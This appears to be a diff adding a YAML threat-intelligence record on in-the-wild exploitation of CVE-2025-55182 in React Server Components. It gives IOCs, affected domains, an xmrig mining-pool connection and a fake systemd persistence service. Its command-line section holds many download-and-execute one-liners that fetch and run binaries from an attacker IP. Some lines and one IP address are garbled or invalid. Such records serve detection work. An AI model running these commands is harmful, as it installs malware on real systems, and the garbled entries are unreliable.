@@ -1,0 +1,384 @@
+description: Threat involves multiple URLs and IP addresses, including a potential
+  remote code execution vulnerability in React Server Components.
+TTPs:
+  processes:
+  - powershell.exe
+  - bash
+  commandline:
+  - waybackurls $1 | grep _next/static | cut -d / -f1,2,3 | sort -u | uniq | tee -a
+    next_target.txt
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/mips;
+    chmod +x mips; ./mips; rm -rf mips
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/mipsel;
+    chmod +x mipsel; ./mipsel; rm -rf mipsel
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/sha;
+    chmod +x sha; ./sha; rm -rf sha
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/x86;
+    chmod +x x86; ./x86; rm -rf x86
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/arm61;
+    chmod +x arm6l; ./arm6l; rm -rf arm6l
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/686;
+    chmod +x i686; ./i686; rm -rf i686
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/ppc;
+    chmod +x ppc; ./ppc; rm -rf ppccd
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/586;
+    chmod +x 586; ./586; rm -rf 586
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/m68k;
+    chmod +x mGSk; ./nb8k; rm -mEBK
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/dc;
+    chmod +x dc; ./dc; rm -of dccd
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/dss;
+    chmod +x dss; ./dss; rm -rf dss
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/co;
+    chmod +x co; ./co; rm -rf cocd
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/scar;
+    chmod +x scar; rm -rf scar
+  - /bin/bash
+  - sex.sh
+  powershell: []
+  scripting_engine:
+  - bash
+  - Bash
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: xmrig
+    destination: pool.supportxmr.com
+    port: '8080'
+  file_activity:
+  - /etc/systemd/system/system-update-service.service
+  - kal.tar.gz
+  - sex.sh
+  - /tmp/mips
+  - /tmp/mipsel
+  - /tmp/sha
+  - /tmp/x86
+  - /tmp/arm6l
+  - /tmp/i686
+  - /tmp/ppc
+  - /tmp/586
+  - /tmp/nb8k
+  - /tmp/dc
+  - /tmp/dss
+  - /tmp/co
+  - /tmp/scar
+  - README.md
+  - jsconfig.json
+  - nextconfig.mjs
+  - package-lock.json
+  - package.json
+  - public/
+  - sex.sh.1
+  - sex.sh2
+  - sex.sh.3
+  - fi/
+  - xoig-624.0/
+  persistence:
+  - Creates a fake systemd service called system-update-service that runs the miner
+    in the background and auto-starts on boot
+  process_relations: []
+CVEs:
+- CVE-2025-55182
+IOCs:
+  hashes:
+  - ddbbd528c3d0bcdd39617676c85dde33
+  ip_addresses:
+  - 154.61.77.105
+  - 177.84.130.195
+  - 209.141.49.251
+  - 185.126.82.162
+  - 212.69.85.41
+  - 45.13.227.97
+  - 45.153.34.41
+  - 196.251.66.201
+  - 38.85.206.203
+  - 217.60.248.193
+  - 16.16.83.161
+  - 40.113.172.145
+  - 48.216.241.15
+  - 177.84.130.195
+  - 113.169.34.152
+  - 118.69.133.148
+  - 14.180.241.218
+  - 14.241.224.72
+  - 123.23.65.83
+  - 113.161.78.97
+  - 14.224.213.77
+  - 123.31.109.0
+  - 123.23.37.191
+  - 13.161.149.151
+  - 13.188.27.0
+  - 116.106.153.209
+  - 14.224.228.111
+  - 113.161.40.161
+  - 14.237.194.235
+  - 14.184.127.207
+  - 115.76.99.31
+  - 18.68.145.227
+  - 113.165.114.5
+  - 14.232.210.90
+  - 113.174.171.82
+  - 117.7.227.87
+  - 115.74.52.134
+  - 171.247.164.125
+  - 183.80.229.162
+  - 123.19.71.114
+  - 113.177.115.29
+  - 171.255.195.154
+  - 27.78.204.42
+  - 222.255.206.191
+  - 116.109.26.195
+  - 27.74.245.28
+  - 14.177.64.69
+  - 14.164.65.102
+  - 118.71.173.34
+  - 171.227.73.35
+  - 1.53.122.55
+  - 113.176.101.203
+  - 113.164.80.83
+  - 17.2.243.78
+  - 14.241.254.9
+  - 113.183.63.160
+  - 171.252.121.187
+  - 27.78.194.138
+  - 1.53.204.241
+  - 14.161.48.14
+  - 171.239.124.132
+  - 42.118.11.27
+  - 117.0.0.182
+  - 42.112.190.191
+  - 14.241.243.138
+  - 27.64.203.25
+  - 1.54.216.27
+  - 42.119.152.222
+  - 14.247.20.245
+  - 14.164.200.150
+  - 171.248.171.81
+  - 123.26.81.97
+  - 103.88.123.187
+  - 1.55.158.125
+  - 196.219.81.67
+  - 197.44.212.133
+  - 196.218.59.242
+  - 197.44.142.234
+  - 41.38.8.176
+  - 41.153.25.179
+  - 196.221.167.175
+  - 196.219.109.187
+  - 197.44.248.123
+  - 197.44.194.66
+  - 41.30.144.234
+  - 196.219.109.109
+  - 197.44.222.90
+  - 196.221.36.213
+  - 196.219.91.243
+  - 41.38.39.163
+  - 102.41.218.166
+  - 41.38.25.163
+  - 62.114.120.189
+  - 102.190.197.173
+  - 197.44.193.226
+  - 196.219.130.194
+  - 213.212.200.78
+  - 41.196.213.226
+  - 156.204.112.170
+  - 196.221.36.219
+  - 41.152.181.165
+  - 41.18.184.191
+  - 154.180.160.34
+  - 1.33.228.115
+  - 1.65.182.227
+  - 197.199.252.93
+  - 197.155.191.45
+  - 196.219.124.18
+  - 196.219.129.34
+  - 1.38.207.241
+  - 196.151.246.185
+  - 196.218.112.184
+  - 196.221.166.234
+  - 41.152.181.172
+  - 41.152.181.171
+  - 41.33.228.114
+  - 41.178.166.66
+  - 196.135.192.59
+  - 41.38.66.205
+  - 41.38.121.93
+  - 196.219.163.48
+  - 2.129.145.77
+  - 197.44.116.171
+  - 41.38.152.181
+  - 197.44.49.242
+  - 196.218.56.170
+  - 197.44.102.211
+  - 196.218.194.165
+  - 41.32.4.228
+  - 196.218.58.149
+  - 41.32.53.76
+  - 41.155.213.77
+  - 41.38.51.138
+  - 46.210.93.73
+  - 176.12.164.70
+  - 176.12.163.250
+  - 2.54.237.68
+  - 130.185.96.75
+  - 109.253.5.229
+  - 46.210.86.177
+  - 2.54.232.199
+  - 46.210.104.968
+  - 5.159.164.217
+  - 46.210.117.104
+  - 80.250.154.93
+  - 46.210.126.111
+  - 80.250.155.90
+  - 46.210.109.93
+  - 82.102.166.174
+  - 82.102.189.120
+  - 46.210.110.149
+  - 82.102.188.142
+  - 109.67.137.238
+  - 109.253.3.207
+  - 46.210.113.204
+  - 2.55.72.63
+  - 1.168.31.76
+  - 194.90.217.166
+  - 95.35.26.78
+  - 82.102.188.190
+  - 95.35.27.143
+  - 2.55.72.76
+  - 46.210.96.213
+  - 46.210.112.212
+  - 109.253.242.229
+  - 176.12.128.83
+  - 2.55.68.241
+  - 31.168.219.113
+  - 46.210.110.123
+  - 95.35.24.181
+  - 109.253.1.140
+  - 2.55.65.76
+  - 46.210.105.188
+  - 95.35.27.43
+  - 176.12.133.209
+  - 2.54.237.226
+  - 185.32.179.80
+  - 176.12.163.72
+  - 46.210.99.219
+  - 95.86.85.118
+  - 2.55.111.200
+  - 46.210.114.177
+  - 95.35.25.134
+  - 46.210.96.96
+  - 2.55.70.151
+  - 46.210.105.129
+  - 5.35.50.24
+  - 109.253.1.195
+  - 95.35.31.243
+  - 46.210.95.217
+  - 41.38.184.191
+  domains:
+  - acorns.com
+  - afterpay.com
+  - binance.us
+  - bitgo.com
+  - bitpanda.com
+  - clearpay.co.uk
+  - clovercoin.com
+  - coindesk.com
+  - consensus.net
+  - currencycloud.com
+  - fiservkucoin.com
+  - nubank.com.br
+  - pixpay.fr
+  - pizzadelivery.ifood.com.br
+  - just-eat.co.uk
+  - lieferando.de
+  - pyszne.pl
+  - bistro.sk
+  - openai.com
+  - starbucks.com
+  - lululemon.com
+  - porsche.com
+  urls:
+  - http://154.61.77.105:8082/
+  - https://help.acorns.com
+  - https://support.acorns.com
+  - https://www.afterpay.com
+  - https://www.binance.us
+  - https://app.bitgo.com
+  - http://bitpanda.com
+  - https://www.clearpay.co.uk
+  - https://www.clovercoin.com
+  - https://www.coindesk.com
+  - https://consensus.net
+  - https://currencycloud.com
+  - https://fiservkucoin.com
+  - http://nubank.com.br
+  - https://pixpay.fr
+  - https://pizzadelivery.ifood.com.br
+  - https://www.just-eat.co.uk
+  - https://www.lieferando.de
+  - https://www.pyszne.pl
+  - https://www.bistro.sk
+  - http://chat.openai.com
+  - https://www.starbucks.com
+  - https://fr.shop.lululemon.com
+  - https://www.porsche.com
+  - http://209.141.49.251/mips
+  - http://209.141.49.251/mipsel
+  - http://209.141.49.251/sha
+  - http://209.141.49.251/x86
+  - http://209.141.49.251/arm61
+  - http://209.141.49.251/686
+  - http://209.141.49.251/ppc
+  - http://209.141.49.251/586
+  - http://209.141.49.251/m68k
+  - http://209.141.49.251/dc
+  - http://209.141.49.251/dss
+  - http://209.141.49.251/co
+  - http://209.141.49.251/scar
+attribution: 'null'
+malware_families: '[''xmrig'']'
+domains:
+- acorns.com
+- afterpay.com
+- clearpay.co.uk
+- aiven.io
+- anytask.com
+- auth0.com
+- digitalplayground.com
+- transangels.com
+- binance.us
+- bitgo.com
+- bitpanda.com
+- bitso.com
+- blockchain.com
+- bolt.eu
+- bugcrowd.com
+- bullish.com
+- carrefouruae.com
+- thinkglobalhealth.org
+- chime.com
+- classdojo.com
+- coindesk.com
+- business.comcast.com
+- ladbrokes.com
+- coral.co.uk
+- mgm-svod.projects.epam.com
+- fivetran.com
+- hostgator.com.br
+- ifood.com.br
+- immutable.com
+- irobot.at
+- irobot.de
+- thuisbezorgd.nl
+- menulog.com.au
+- takeaway.com
+- skipthedishes.com
+- just-eat.dk
+- play.immutable.com
+- market.immutable.com
+- hub.immutable.com
+- passport.immutable.com
+- auth.immutable.com
+reference: https://theravenfile.com/2025/12/12/react2shell-exploitation-in-the-wild/
+date_of_publication: December 12, 2025
+file_creation_date: December 15, 2025
